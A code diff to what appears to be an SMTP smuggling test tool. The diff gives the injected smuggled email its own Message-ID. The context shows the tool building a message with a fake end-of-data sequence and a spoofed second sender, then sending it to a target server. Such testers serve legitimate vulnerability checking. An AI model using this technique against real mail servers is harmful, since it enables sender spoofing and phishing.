@@ -187,6 +187,7 @@ def check_smuggling(inbound_smtp_server, sender_domain, receiver_address, tls, p
 
             mail_date = email.utils.format_datetime(datetime.datetime.now())
             message_id = email.utils.make_msgid(domain=sender_domain)
+            message_id2 = email.utils.make_msgid(domain=sender_domain)
             server.ehlo(sender_domain)
             sender_address = f"test@{sender_domain}"
             sender_address_smuggled = f"smuggled@{sender_domain}"
@@ -206,13 +207,13 @@ From: {sender_address_smuggled}
 To: {receiver_address}
 Subject: SMUGGLED EMAIL ({eod_sequence_string})
 Date: {mail_date}
-Message-ID: {message_id}
+Message-ID: {message_id2}
 
 SMUGGLING WORKS with {eod_sequence_string} as "fake" end-of-data sequence!
 .
 """
             check_message = _fix_eols(check_message)
-            check_message = check_message.format(inject=eod_sequence, eod_sequence_string=eod_sequence_string, sender_address=sender_address, sender_address_smuggled=sender_address_smuggled, receiver_address=receiver_address, mail_date=mail_date, message_id=message_id)
+            check_message = check_message.format(inject=eod_sequence, eod_sequence_string=eod_sequence_string, sender_address=sender_address, sender_address_smuggled=sender_address_smuggled, receiver_address=receiver_address, mail_date=mail_date, message_id=message_id, message_id2=message_id2)
             server.sendmail(sender_address, [receiver_address], check_message)
             out.success(f"Sent smuggling e-mail for end-of-data sequence {eod_sequence_string}! Check your inbox!")
             while True:
